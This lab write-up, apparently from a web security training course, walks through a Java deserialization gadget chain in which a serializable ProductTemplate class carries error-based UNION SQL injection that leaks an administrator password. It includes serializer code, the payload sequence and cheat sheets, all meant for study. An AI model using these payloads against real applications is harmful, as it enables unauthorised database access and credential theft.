# Developing a Custom Gadget Chain for Java Deserialization


**Difficulty:** Expert



**Category:** Insecure Deserialization / Java Deserialization / SQL Injection

**Status:** Solved ✅



## Overview



This lab demonstrates how a custom Java deserialization gadget can be chained with SQL injection to extract the administrator password.



The application expects a serialized `AccessTokenUser` object in the session cookie.



However, the exposed source code revealed another serializable class, `ProductTemplate`, containing a custom `readObject()` method.



The method builds a SQL query using the attacker-controlled `id` field:



```java

String sql = String.format(

    "SELECT * FROM products WHERE id = '%s' LIMIT 1",

    id

);

```



This creates the following attack chain:



```text

Serialized ProductTemplate

        ↓

readObject()

        ↓

SQL Injection

        ↓

UNION SELECT

        ↓

Error-based extraction

        ↓

Administrator password

        ↓

Administrator login

        ↓

Delete Carlos

```



---



# 1. Source Code Discovery



The application exposed backup source files:



```text

/backup/AccessTokenUser.java

/backup/ProductTemplate.java

```



## AccessTokenUser.java



```java

package data.session.token;



import java.io.Serializable;



public class AccessTokenUser implements Serializable

{

    private final String username;

    private final String accessToken;



    public AccessTokenUser(String username, String accessToken)

    {

        this.username = username;

        this.accessToken = accessToken;

    }



    public String getUsername()

    {

        return username;

    }



    public String getAccessToken()

    {

        return accessToken;

    }

}

```



This is the object type normally expected by the application.



---




# 2. The Custom Gadget



The interesting class was `ProductTemplate`.



The important part of the source code is:



```java

private void readObject(ObjectInputStream inputStream)

    throws IOException, ClassNotFoundException

{

    inputStream.defaultReadObject();



    ...



    String sql = String.format(

        "SELECT * FROM products WHERE id = '%s' LIMIT 1",

        id

    );



    ...

}

```



The `id` field is stored inside the serialized object and can therefore be controlled by the attacker.



During deserialization:



```java

ObjectInputStream.readObject()

```



causes `ProductTemplate.readObject()` to execute.



---



# 3. Building the Serialized Object



We created a small Java serializer locally.



## Main.java



```java

import data.productcatalog.ProductTemplate;

import java.io.ByteArrayOutputStream;

import java.io.ObjectOutputStream;

import java.io.Serializable;

import java.util.Base64;




class Main {


    public static void main(String[] args) throws Exception {



        ProductTemplate productTemplate =
            new ProductTemplate(

                "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --"

            );



        String serializedObject = serialize(productTemplate);



        System.out.println("Serialized object: " + serializedObject);
    }



    private static String serialize(Serializable obj) throws Exception {

        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);



        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {

            out.writeObject(obj);

        }



        return Base64.getEncoder().encodeToString(baos.toByteArray());

    }

}

```



### Why only serialize locally?




We did not perform local deserialization.


If we called:



```java

ObjectInputStream.readObject()

```



locally, `ProductTemplate.readObject()` would execute and attempt to connect to PostgreSQL.



The intended flow was:



```text

Local machine:
ProductTemplate → Serialize → Base64



Lab server:

Base64 → Deserialize → readObject() → SQL query

```



---



# 4. Installing the Java Compiler



Initially:



```text

javac: command not found

```


We installed the JDK:



```bash

sudo apt update

sudo apt install default-jdk


```



Then verified:



```bash
javac --version

java --version

```



Compilation:


```bash

cd ~/java-deserialization-lab



javac Main.java data/productcatalog/*.java common/db/*.java



java Main

```



This produced:



```text

Serialized object: rO0AB...

```



The Base64 output was placed into the session cookie:



```http

Cookie: session=BASE64_PAYLOAD

```



---



# 5. Enumerating the Number of Columns



We first tested:




```sql

' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --

```



Java payload:




```java

ProductTemplate productTemplate =

    new ProductTemplate(

        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --"



    );

```



The server returned:



```text

java.lang.ClassCastException:

Cannot cast data.productcatalog.ProductTemplate

to lab.actions.common.serializable.AccessTokenUser

```




This indicated that the SQL query executed successfully and the application reached the point where it attempted to cast the resulting 
object to the expected session type.



Therefore:



```text


Number of columns = 8


```



---



# 6. Finding a Numeric Column



We tested column 4 with a string:


```sql

' UNION SELECT NULL,NULL,NULL,'hack',NULL,NULL,NULL,NULL --

```



Java:



```java

ProductTemplate productTemplate =

    new ProductTemplate(

        "' UNION SELECT NULL,NULL,NULL,'hack',NULL,NULL,NULL,NULL --"

    );

```



The server returned:



```text

invalid input syntax for type integer: "hack"

```



This showed that column 4 expects an integer-compatible value.



---



# 7. Testing Numeric Values



We then tested:


```sql

' UNION SELECT NULL,NULL,NULL,CAST(1 AS numeric),NULL,NULL,NULL,NULL --

```



Java:



```java


ProductTemplate productTemplate =

    new ProductTemplate(

        "' UNION SELECT NULL,NULL,NULL,CAST(1 AS numeric),NULL,NULL,NULL,NULL --"

    );


```



The PostgreSQL type error disappeared and the application returned the `ClassCastException`.



Therefore:



```text


Column 4 accepts numeric values.

```



---



# 8. Testing a Subquery



We also verified that a subquery could execute inside column 4:



```sql

' UNION SELECT NULL,NULL,NULL,CAST((SELECT COUNT(*) FROM information_schema.tables) AS numeric),NULL,NULL,NULL,NULL --

```




Java:



```java

ProductTemplate productTemplate =

    new ProductTemplate(

        "' UNION SELECT NULL,NULL,NULL,CAST((SELECT COUNT(*) FROM information_schema.tables) AS numeric),NULL,NULL,NULL,NULL --"

    );

```



The request again reached the `ClassCastException`, confirming that the subquery executed successfully.



---



# 9. Extracting the Administrator Password



Once the database structure was identified, the final payload was:



```sql

' UNION SELECT NULL,NULL,NULL,CAST(password AS numeric),NULL,NULL,NULL,NULL FROM users--

```



Java:



```java

ProductTemplate productTemplate =

    new ProductTemplate(

        "' UNION SELECT NULL,NULL,NULL,CAST(password AS numeric),NULL,NULL,NULL,NULL FROM users--"


    );

```



The resulting serialized object was generated with:



```bash
javac Main.java data/productcatalog/*.java common/db/*.java

java Main

```



The Base64 output was then placed in the session cookie.



---



# 10. Why `CAST(password AS numeric)`?


Column 4 requires a numeric value.




However, the password is a string.


Therefore:



```sql

CAST(password AS numeric)

```


is intentionally invalid for a password such as:



```text

b2u1x5e98j9ca50uktc2

```



PostgreSQL generates an error containing the value it attempted to convert.



The server returned:



```text

invalid input syntax for type numeric:

"b2u1x5e98j9ca50uktc2"

```


This revealed the administrator password:



```text

b2u1x5e98j9ca50uktc2

```



---



# 11. Administrator Login



We logged in with:



```text

Username: administrator

Password: b2u1x5e98j9ca50uktc2

```



Then opened the admin panel and deleted:




```text

carlos
```




The lab was solved.



---


# 12. Payload Cheat Sheet



## Determine the number of columns



```sql
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL --
```



**Purpose:** Confirm that the query requires 8 columns.



---



## Test column 4



```sql

' UNION SELECT NULL,NULL,NULL,'hack',NULL,NULL,NULL,NULL --

```



**Purpose:** Trigger a type error and determine that column 4 does not accept strings.



---



## Test numeric input



```sql

' UNION SELECT NULL,NULL,NULL,CAST(1 AS numeric),NULL,NULL,NULL,NULL --

```



**Purpose:** Confirm that column 4 accepts numeric values.



---



## Test a subquery




```sql

' UNION SELECT NULL,NULL,NULL,CAST((SELECT COUNT(*) FROM information_schema.tables) AS numeric),NULL,NULL,NULL,NULL --

```



**Purpose:** Confirm that subqueries execute successfully in column 4.



---



## Extract the password



```sql

' UNION SELECT NULL,NULL,NULL,CAST(password AS numeric),NULL,NULL,NULL,NULL FROM users--

```



**Purpose:** Force PostgreSQL to reveal the password through a numeric conversion error.


---



# 13. Commands Cheat Sheet


Install JDK:



```bash

sudo apt update


sudo apt install default-jdk

```




Check Java:



```bash

javac --version

java --version

```



Compile:



```bash

cd ~/java-deserialization-lab

javac Main.java data/productcatalog/*.java common/db/*.java

```




Generate serialized object:



```bash

java Main

```



Then copy:




```text

Serialized object: <BASE64>
```



into:



```http

Cookie: session=<BASE64>

```



---



# 14. Final Attack Chain


```text

Session Cookie

      ↓


Base64 serialized Java object

      ↓

ProductTemplate

      ↓

readObject()

      ↓

Attacker-controlled id


      ↓

SQL Injection
      ↓

UNION SELECT

      ↓

8 columns
      ↓


Column 4 = numeric


      ↓

CAST(password AS numeric)

      ↓


PostgreSQL error



      ↓

Administrator password

      ↓

Administrator login


      ↓
Delete Carlos

      ↓
SOLVED ✅
```




# 15. Key Takeaways


* Java deserialization can invoke custom `readObject()` methods.

* A custom application class can act as a deserialization gadget.

* The gadget can introduce a second vulnerability such as SQL injection.

* `UNION SELECT` can be used to match the underlying query structure.

* PostgreSQL type errors can disclose attacker-selected values.


* `CAST(password AS numeric)` was used as an error-based extraction technique.

* `ClassCastException` was useful during testing because it indicated that the SQL execution had progressed successfully.



**Lab completed: Developing a Custom Gadget Chain for Java Deserialization ✅**
